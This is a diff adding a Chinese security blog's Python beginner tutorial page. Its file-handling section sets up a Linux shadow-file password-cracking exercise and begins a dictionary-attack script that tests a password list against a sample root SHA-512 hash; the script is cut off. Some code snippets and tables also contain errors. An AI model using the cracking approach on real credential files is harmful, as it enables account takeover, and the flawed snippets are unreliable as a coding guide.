@@ -1,0 +1,1218 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="白尾青芳の小窝">
+  <title>python | 白尾青芳の小窝</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&family=Space+Grotesk:wght@500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css?v=20260722-2148">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <video class="backdrop" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source src="/images/wallpaper.mp4" type="video/mp4">
+  </video>
+
+  <button class="mobile-menu" id="menuToggle" type="button" aria-label="打开导航" aria-expanded="false">
+    <span></span><span></span><span></span>
+  </button>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="profile">
+      <img class="avatar" src="/images/fox-avatar.jpg" alt="白尾青芳头像">
+      <p class="eyebrow">SECURITY · CODE · NOTES</p>
+      <h1>白尾青芳</h1>
+      <p class="motto">在每一次请求与响应之间，找到系统真实的边界。</p>
+    </div>
+
+    <nav class="main-nav" aria-label="主导航">
+      <a class="" href="/"><i data-lucide="home"></i><span>博客首页</span></a>
+      <a class="" href="/study/"><i data-lucide="book-open"></i><span>学习导航</span></a>
+      <a href="/categories/Web-%E5%AE%89%E5%85%A8/"><i data-lucide="shield-check"></i><span>Web 安全</span></a>
+      <a href="/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"><i data-lucide="code-2"></i><span>开发笔记</span></a>
+      <a class="" href="/archives/"><i data-lucide="archive"></i><span>文章归档</span></a>
+      <a href="/about/"><i data-lucide="user-round"></i><span>关于我</span></a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="social-links">
+        <a target="_blank" rel="noopener" href="https://github.com/baiweiqingfang" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .5C5.65.5.5 5.65.5 12c0 5.1 3.29 9.43 7.86 10.96.58.1.79-.25.79-.56v-2.14c-3.2.7-3.87-1.36-3.87-1.36-.52-1.34-1.28-1.7-1.28-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.17 1.18.92-.26 1.9-.38 2.88-.39.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.39-5.25 5.67.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/></svg></a>
+        <a href="/atom.xml" aria-label="RSS" title="RSS"><i data-lucide="rss"></i></a>
+      </div>
+      <p>© 2026 白尾青芳 · Powered by Hexo</p>
+    </div>
+  </aside>
+
+  <main class="content">
+    <article class="article-page">
+  <header class="article-header">
+    <p class="eyebrow">learning</p>
+    <h1>python</h1>
+    <div class="post-meta">
+      <time datetime="2026-06-19T11:52:58.000Z">2026.06.19</time>
+      <span>4 分钟阅读</span>
+    </div>
+  </header>
+  <div class="article-content">
+    
+# python教程
+
+一切皆对象
+
+## 1.python初识
+
+### 1.1python语法结构
+
+#### 注释
+
+1.从#开始直到一行结束的内容
+
+2.单引号，双引号，闭合的连续三个单引号或双引号
+
+#### 缩进
+
+python代码块通过缩进/对齐表达代码逻辑
+
+#### 续行
+
+一行过长的语句可以使用反斜杠\分解成几行
+
+### 1.2python变量
+
+#### 1.2.1变量命名
+
+由字母，数字，下划线或三者任意组合构成，不能以数字开头
+
+#### 变量赋值
+
+变量的类型和值在复制的那一刻被初始化，变量赋值通过赋值运算符=来执行
+
+#### 捕获屏幕输入
+
+### 1.3运算符
+
+#### 1.3.1算数运算符
+
+参与运算操作的是数字，结果也是数字
+
+| 算数运算符 | 解释                                                         |
+| ---------- | ------------------------------------------------------------ |
+| +          | 如果操作数是数字类型，则算术运算   如果操作数是字符类型，则字符串拼接 |
+| -          |                                                              |
+| *          | 如果操作数是数字类型，则算数运算  如果两个操作数其中一个是字符串类型，另一个是数字类型，则将字符串重复输出 |
+| /          |                                                              |
+| //         | 取商                                                         |
+| %          | 取余                                                         |
+| **         | 幂运算                                                       |
+| +          | 正号                                                         |
+| -          | 负号                                                         |
+
+#### 1.3.2比较运算符
+
+| 比较运算符 | 解释（运算结果是布尔类型的值，True\|False） |
+| ---------- | ------------------------------------------- |
+| <          |                                             |
+| <=         |                                             |
+| >          |                                             |
+| >=         |                                             |
+| ==         |                                             |
+| !=         |                                             |
+
+#### 1.3.3逻辑运算符
+
+参与运算的操作数是布尔类型的值，运算结果是布尔类型的值
+
+| 逻辑运算符 | 解释       | 字符表达 |
+| ---------- | ---------- | -------- |
+| and        | 逻辑与运算 | &        |
+| or         | 逻辑或运算 | \|       |
+| not        | 逻辑非运算 |          |
+
+#### 1.3.4位运算符
+
+| 位运算符 | 解释     |
+| -------- | -------- |
+| ~        | 按位取反 |
+| >>       | 右移     |
+| <<       | 左移     |
+| ^        | 按位异或 |
+| \|       | 按位或   |
+
+#### 1.3.4身份运算符
+
+| 身份运算符 | 说明           |
+| ---------- | -------------- |
+| is         | 属于同一个对象 |
+| is not     | 不是同一个对象 |
+
+#### 1.3.5成员运算符
+
+| 成员运算符 | 说明     |
+| ---------- | -------- |
+| in         | 存在于   |
+| in not     | 不存在于 |
+
+#### 1.3.6赋值运算符
+
+### 1.4标识符
+
+#### 1.4.1关键字
+
+关键字不能作为变量名，函数名，类名
+
+通过keyword模块查看关键字
+
+#### 1.4.2builtins
+
+内置函数，在任何地方都可以调用
+
+abs ()
+
+delattr()
+
+hash()
+
+memoryview()
+
+set()
+
+all()
+
+dict()
+
+help()
+
+min()
+
+setattr()
+
+any()
+
+dir()
+
+hex( )
+
+next()
+
+ascii()
+
+divmod()
+
+id()
+
+object(
+
+sorted()
+
+bin()
+
+enumerate()
+
+input ()
+
+staticmethod()
+
+bool()
+
+eval()
+
+int()
+
+oct()
+
+open()
+
+str()
+
+breakpoint()
+
+exec()
+
+isinstance()
+
+ord()
+
+sum()
+
+bytearray()
+
+filter()
+
+issubclass()
+
+super ()
+
+pow(
+
+bytes()
+
+float()
+
+iter()
+
+print ()
+
+输出时默认换行
+
+tuple()
+
+callable()
+
+format()
+
+##### len()
+
+返回对象的长度或项目个数
+
+property()
+
+type()
+
+chr ()
+
+frozenset()
+
+listO
+
+##### range()
+
+用来产生一个不变的数值序列,而且这个序列通常都是用在循环中的
+
+range（a, b, c）
+
+生成从a到b-1的序列，间隔为c
+
+vars()
+
+classmethod()
+
+getattr()
+
+locals()
+
+repr ()
+
+zip()
+
+compile()
+
+globals()
+
+map()
+
+reversed( )
+
+import_()
+
+complex()
+
+hasattr()
+
+max()
+
+round( )
+
+
+
+保留的常量：
+
+True
+
+False
+
+None
+
+## 2.python变量类型
+
+### 2.1整型
+
+### 2.2 浮点型
+
+### 2.3布尔型
+
+### 2.4复数型
+
+### 2.5字符串
+
+#### 2.5.1字符串拼接
+
+使用+号将多个字符串拼接在一起
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome, &quot;</span> + username)</span><br></pre></td></tr></table></figure>
+
+使用*号将一个字符串重复多次输出
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username * <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+#### 2.5.2字母与ASCII
+
+| 单个字符操作            | 例       |
+| ----------------------- | -------- |
+| 将单个字符转化为ASCII码 | ord('a') |
+| 将ASCII码转化为单个字符 | chr(97)  |
+
+#### 2.5.3字符串操作
+
+| 字符串操作                                                   | 实例                                                    |
+| ------------------------------------------------------------ | ------------------------------------------------------- |
+| 比较运算：字符串按照字符的ASCII码值进行比较                  | 'b' < 'bool<br>'b' > 'abcd'                             |
+| 角标访问：利用偏离量获取字符串中的字符                       | username[1]                                             |
+| 切片：取子串<br>str[n:m],n,m均代表偏移量，m > n,[n, m-1]<br>str[::n],每n个字母一组，取第一个字母<br>str[::-1],字符串反向 | 'username'[1:3]<br>'username'[::3]<br/>'username'[::-1] |
+| 成员关系：字符串A是否是字符串B的子串                         | 'u' in 'username'<br>'U' not in 'username'              |
+
+#### 字符串格式化输出
+
+f修饰符，屏蔽数据类型
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&#x27;username&#x27;</span></span><br><span class="line"><span class="string">f&quot;Welcome, <span class="subst">&#123;username&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+#### 2.5.4字符串常用内建函数
+
+| 常用内建函数          | 说明                                                      |
+| --------------------- | --------------------------------------------------------- |
+| `s.strip()`           | 删除字符串头尾指定的字符（默认为空格或换行符）或字符序列  |
+| `s.replace(sub, rep)` | 搜索s字符串中的sub，并替换为rep                           |
+| `s.split(c)`          | 分割字符串，并返回一个列表，可以指定分隔符c，默认为空白。 |
+| `s.center(width)`     | 返回一个原字符串居中，并使用空格填充至长度width的新字符串 |
+| `s.upper()`           | 转换字符串中的小写字母为大写                              |
+| `s.lower()`           | 转换字符串中的大写字母为小写                              |
+| `s.rfind()`           | 返回字符串最后一次出现的位置，如果没有匹配项则返回 -1     |
+| `s.capitalize()`      | 使字符串的首字母大写                                      |
+| `s.find()`            | 获得某字符在字符串中的位置                                |
+| `s.startswith()`      | 检查字符串是否以指定字符（串）开头                        |
+| `s.endswith()`        | 检查字符串是否以指定字符（串）结尾                        |
+| `s.rjust()`           | 将字符串以指定的宽度靠右放置左侧填充指定的字符            |
+| `s.isdigit()`         | 检查字符串是否由数字构成                                  |
+| `s.isalpha()`         | 检查字符串是否由字母构成                                  |
+
+s.rfind(str, beg=0, end=len(string))
+
+str  查找的字符串
+
+beg  开始查找的位置，默认为 0
+
+end  结束查找位置，默认为字符串的长度。
+
+#### 原始字符串
+
+一种特殊的字符串字面量，用于避免反斜杠\被转义
+
+“字符串字面量”（string literal）是编程中的一个基础术语，指的是在源代码中直接写出的、固定不变的字符串值，而不是通过变量、函数返回或其他方式动态生成的。
+
+##### 语法
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">r&quot;&quot;</span></span><br><span class="line"><span class="string">r&#x27;&#x27;</span></span><br><span class="line"><span class="string">R&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+### 2.6列表
+
+#### 列表定义
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stu1 = [<span class="string">&#x27;user&#x27;</span>, <span class="literal">True</span>, age, score]</span><br></pre></td></tr></table></figure>
+
+#### 列表元素访问
+
+通过偏移量访问列表元素
+
+#### 列表操作
+
+可以通过角标访问的数据类型，叫做序列。序列支持的操作：
+
+角标访问
+
+加法或乘法
+
+切片
+
+成员关系判断
+
+#### 作用于列表函数
+
+直接向函数中传参，参数为列表
+
+| 函数          | 说明             | 示例                   |
+| ------------- | ---------------- | ---------------------- |
+| `list()`      | 将序列转化成列表 | `list('AJEST')`        |
+| `len()`       | 长度             | `len(stu)`             |
+| `max()`       | 最大值           | `max(stu)`             |
+| `min()`       | 最小值           | `min(stu)`             |
+| `sorted()`    | 排序             | `sorted(stu)`          |
+| `enumerate()` | 取脚标和元素     | `list(enumerate(stu))` |
+
+#### 列表内建函数
+
+| 函数                   | 说明                               | 示例 |
+| ---------------------- | ---------------------------------- | ---- |
+| `l.append(obj)`        | 向列表中添加一个对象obj。          |      |
+| `l.pop(obj)`           | 删除列表中的元素。                 |      |
+| `l.count(obj)`         | 返回一个对象obj 在列表中出现的次数 |      |
+| `l.index(obj)`         | obj 首次出现的位置                 |      |
+| `l.insert(index, obj)` | 在偏移量为index 的位置插入对象obj  |      |
+| `l.reverse()`          | 翻转列表                           |      |
+| `l.sort()`             | 排序                               |      |
+| `l.extend(seq)`        | 把序列seq 的内容添加到列表中       |      |
+
+#### 多维列表
+
+列表的元素也可以是列表
+
+### 元组
+
+元组是列表中的特例，元组一旦定义，不能改变
+
+#### 元组定义
+
+可以认为是静态的列表
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stu1 = (<span class="string">&#x27;username&#x27;</span>, <span class="literal">True</span>, <span class="number">24</span>, <span class="number">60</span>)</span><br></pre></td></tr></table></figure>
+
+#### 元组操作
+
+元组也是序列类型
+
+#### 单元素元组
+
+如果一个元组中只有一个元素，那么创建该元组时需要加上一个逗号
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="string">&quot;username&quot;</span>,)</span><br></pre></td></tr></table></figure>
+
+### 2.8字典
+
+#### 字典定义
+
+字典是由键-值(key-value)对构成的映射数据类型，通过键取值，不支持下标操作,使用相应的键取值
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stu1 = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;username&quot;</span>, <span class="string">&#x27;sex&#x27;</span>:<span class="literal">True</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">24</span>, <span class="string">&#x27;score&#x27;</span>:<span class="number">89</span>&#125;</span><br><span class="line">stu1[<span class="string">&#x27;score&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+#### 添加字典元素
+
+通过键名更新字典键值：如果字典中有该键名，则更新对应的键值；如果字典中没有该键名，则向字典中添加键值对
+
+#### 作用于字典的函数
+
+| 函数   | 说明                           |
+| ------ | ------------------------------ |
+| len()  | 返回字典中元素的数目           |
+| list() | 返回字典中使用的所有键名的列表 |
+
+#### 字典内建方法
+
+| 方法              | 说明                                                         |
+| ----------------- | ------------------------------------------------------------ |
+| `d.copy()`        | 返回字典的一个副本                                           |
+| `d.get(key)`      | 对字典dict 中的键key，返回它对应的值value。如果字典中不存在此键，则返回default 的值。 |
+| `d.keys()`        | 返回一个包含字典中键的列表                                   |
+| `d.values()`      | 返回一个包含字典中所有值的列表                               |
+| `d.update(dict2)` | 将字典dict2 的键-值对添加到字典dict                          |
+| `d.items()`       | 返回一个包含字典中(键, 值)对元组的列表                       |
+
+ ## 3.流程控制
+
+### 3.1条件分支
+
+#### 3.1.1单向条件分支
+
+if
+
+#### 3.1.2双向条件分支
+
+if
+
+else
+
+#### 3.1.3多向条件分支
+
+if
+
+elif
+
+...
+
+else
+
+### 3.2循环结构
+
+#### 3.2.1while循环
+
+#### 3.2.2for循环
+
+遍历所有元素。python中的for循环接受可迭代对象作为其参数。
+
+### 特殊流程
+
+#### break
+
+#### continue
+
+触发continue语句时，程序会忽略下方语句，回到循环的顶端继续循环，意味着本次循环轮空
+
+## 4.函数
+
+### 4.1函数的定义与调用
+
+逻辑上讲，函数是一个功能；代码上讲，函数是多条Python语句的集合（语句块）
+
+函数是对程序逻辑进行结构化或过程化的一种编程方法，将整块代码巧妙地隔离成易于管理的小块。把重复代码放到函数中而不是进行大量的拷贝，既能节省空间，也有助于保持一致性；通常函数都是用来实现某一功能
+
+#### 创建函数
+
+Python中函数用def语句来创建
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">function_name</span>(<span class="params">args</span>): <span class="comment"># 定义一个函数</span></span><br></pre></td></tr></table></figure>
+
+标题行由def关键字，函数名，参数的集合（如果有）来构成
+
+def 子句(函数体)的部分包括:
+
+(可选)体现为字符串的函数文档(函数说明,以及帮助等信息)
+
+(必需)函数体
+
+#### 调用函数
+
+Python用（）调用函数
+
+注：如果没有加圆括号，只是对函数的引用
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>();</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;This is function test.&quot;</span>)</span><br><span class="line">test()	</span><br></pre></td></tr></table></figure>
+
+函数调用过程：
+
+函数被调用时，会单独开辟一段私有的内存空间
+
+函数运行结束后，会回到调用函数的位置，继续向下执行
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;This is function a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Function b start ... &quot;</span>)</span><br><span class="line">a()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Function b stop!&quot;</span>)</span><br><span class="line"></span><br><span class="line">b()</span><br></pre></td></tr></table></figure>
+
+#### 前向引用
+
+先定义函数，后调用函数
+
+#### 4.1.2函数返回值
+
+多数情况下，函数并不直接打印数据，而是向调用者返回一个值：
+
+函数的返回值使用return关键字
+
+没有return函数默认返回None
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">X = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">y = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = x + y</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add())</span><br></pre></td></tr></table></figure>
+
+### 函数参数
+
+#### 定义参数
+
+| 参数类型 | 说明                                                         |
+| -------- | ------------------------------------------------------------ |
+| 形式参数 | 函数定义时，紧跟在函数名后圆括号内的参数被称为形式参数,简称形参。<br/>由于它不是实际存在变量,所以又称虚拟变量。 |
+| 实际参数 | 函数调用时,函数名后面括号中的参数(可以是一个表达式)<br/>称为“实际参数”,简称实参。 |
+
+注：实参与形参要一一对应
+
+#### 默认参数
+
+不向该参数传入值也是允许的
+
+#### 关键字参数
+
+关键字参数的概念仅针对于函数的调用，让调用者通过函数调用中的参数名字来区分参数，这样规范允许参数缺失或者不按顺序
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x = <span class="number">0</span>; y = <span class="number">0</span></span>)：</span><br><span class="line">	<span class="built_in">sum</span> = x + y</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"><span class="built_in">print</span>(add(y = <span class="number">10</span>, x = <span class="number">3</span>))</span><br></pre></td></tr></table></figure>
+
+### 函数变量作用域
+
+全局和局部的问题
+
+#### 局部变量
+
+局部变量是在函数内部定义的变量,随着函数的调用而被创建,函数调用完毕之后,即销毁。局部变量在函数调用后,才被创建,其作用范围,
+仅限于函数内部。
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">	x = <span class="number">10</span></span><br><span class="line">	<span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test()</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NameError: name &#x27;x&#x27; is not defined</span></span><br></pre></td></tr></table></figure>
+
+#### 全局变量
+
+在函数外部定义的变量
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">	<span class="comment"># x = 3</span></span><br><span class="line">	<span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">test ()</span><br></pre></td></tr></table></figure>
+
+函数内部可以直接使用函数外部的变量。
+
+#### 命名空间
+
+提到变量作用域,可以想像是否可以“看见”这个变量的名字。
+
+任何时候,总有一个到三个活动的作用域,分别为局部、全局和内建。标识符(变量名,函数名)的搜索顺序依次是局部、全局和内建。
+
+### 其他特性
+
+#### 函数属性
+
+函数属性就是函数名加上.__能够访问到的内容。
+
+#### 内部函数
+
+在函数体内创建另外一个函数是完全合法的,这种函数叫做内部/内嵌函数
+
+#### 位置函数
+
+位置参数,与shell 脚本类似,程序名以及参数都以位置参数的方式传递给Python 程序。
+
+使用sys 模块的argv 列表接收。
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># x = input (&quot;Please input a number as x: &quot;)</span></span><br><span class="line">x = sys.argv[<span class="number">1</span>]</span><br><span class="line">x = <span class="built_in">int</span> (x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># y = input (&quot;Please input a number as y: &quot;)</span></span><br><span class="line">y = sys. argv [<span class="number">2</span>]</span><br><span class="line">y = <span class="built_in">int</span>(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x=<span class="number">0</span>, y=<span class="number">0</span></span>):</span><br><span class="line">	<span class="string">&quot;add(10, 3) means 10 + 3 = 13&quot;</span></span><br><span class="line">	<span class="built_in">sum</span> = x + y</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add(x =x, y=y))</span><br></pre></td></tr></table></figure>
+
+## 5.文件对象
+
+### 5.1概述
+
+#### 5.1.1需求
+
+Linux shadow文件破解，从字典文件中读取密码
+
+思路：
+
+从shadow文件中提取密码密文
+
+从密码密文中提取盐值
+
+从密码字典文件中读取密码
+
+把读取的密码与盐值进行加密运算，得到猜测的密码密文
+
+如果猜测的密码密文与shadow文件中的密码密文一致，说明密码猜对了
+
+| 常用函数         | 功能                                         |
+| ---------------- | -------------------------------------------- |
+| f = open('PATH') | 打开指定路径的文件f是文件对象                |
+| f.read()         | 从文件对象中读取文件内容                     |
+| f.readline()     | 读取一行内容                                 |
+| f.readlines()    | 返回一个列表，元素是文件的每一行内容的字符串 |
+| f.write()        | 向文件中写入内容                             |
+| f.writelines()   | 以列表的方式向文件中写入内容                 |
+| f.close()        | 关闭文件                                     |
+| time.sleep()     | 沉睡响应的秒数                               |
+| f.closed         | 查看文件关闭状态                             |
+
+read()方法读取文件中所有内容，慎用
+
+比较适合读取二进制文件，不适合读取纯文本文件
+
+要读取非UTF-8编码的文本文件，要给open()函数传入encoding参数，有些编码不规范的文件，open()函数还接收一个erros参数，表示遇到编码错误后如何处理
+
+readline()
+
+读取下个行结束符前的所有字节，包括行结束符，作为字符串返回
+
+该函数每执行一次，向下读取一行
+
+write()内建方法功能把含有文本数据或二进制数据块的字符串写入到文件中去
+
+写入文件时，不会自动添加行结束标志，需要程序员手工输入
+
+writelines()方法是针对列表的操作，他接受一个字符串列表作为参数，将他们写入文件，行结束符并不会被自动加入，需要时必须在调用writelines()前给每行结尾加上行结束符
+
+#### 5.2建议
+
+文件读写时，使用文件绝对路径，熟练后改为相对路径
+
+### 5.2文件打开方式
+
+#### 5.2.1访问模式
+
+| 访问模式 | 操作             | 说明                             |
+| -------- | ---------------- | -------------------------------- |
+| r(read)  | 以读方式打开     | 文件不存在则报错，文件存在则读取 |
+| w(write) | 以写方式打开     | 文件不存在则创建，文件存在则清空 |
+| a(add)   | 以追加模式打开   | 文件不存在则创建，文件存在则追加 |
+| +        | 以读写模式打开   | 如r+,w+,a+                       |
+| b        | 以二进制模式打开 | 如rb,wb,ab                       |
+| x        | 以写方式打开     | 文件不存在会产生异常             |
+| t        | 以文本模式打开   | 默认                             |
+
+常用打开文件参数：
+
+r
+
+w
+
+a
+
+rb
+
+wb
+
+ab
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./pass.dic&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+#### 5.2.2文件迭代
+
+如果需要逐行处理文件，可以结合for循环迭代文件
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&quot;./pass.dic&quot;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">	<span class="built_in">print</span>(i.strip())</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+有可能遇到的问题:
+
+在编程时,f.close()方法容易忘记写
+
+在处理文件时,有可能会遇到异常,导致整个脚本强制退出,f.close()不会被执行到
+
+文件迭代改进方法
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&quot;./pass.dic&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file = path, mode = <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">		<span class="built_in">print</span>(line.strip(</span><br></pre></td></tr></table></figure>
+
+### 5.3序列化
+
+序列化指把变量从内存中变成可存储或传输的过程
+
+pickle模块可以用来实现序列化
+
+### Linux用户密码破解
+
+使用Linux系统编程爆破用户密码（shadow文件）
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> passlib.<span class="built_in">hash</span> <span class="keyword">import</span> sha512_crypt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1. Kali 中编写脚本</span></span><br><span class="line"><span class="string">2. 推荐 Python 3.9+</span></span><br><span class="line"><span class="string">3. shadow 文件来自于 CentOS7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shadow_line = <span class="string">&quot;root:$6$2QwMfllu$YrYn5VIUyKm9oBisfrtLfi0eIvzFyIjASuq3jyWF2RoxlF8N.Ctv4J27.3pRVwL3h82PPlCImXFjSj0I3.qYG0:19470:0:99999:7:::&quot;</span></span><br><span class="line">shadow_cipher = shadow_line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 salt：对 sha512_crypt，salt 是 &quot;$6$salt&quot; 格式</span></span><br><span class="line"><span class="comment"># passlib 的 verify() 可直接使用完整哈希字符串，无需手动分离 salt</span></span><br><span class="line"></span><br><span class="line">password_dic_path = <span class="string">&quot;password_top1000.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_dic_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span 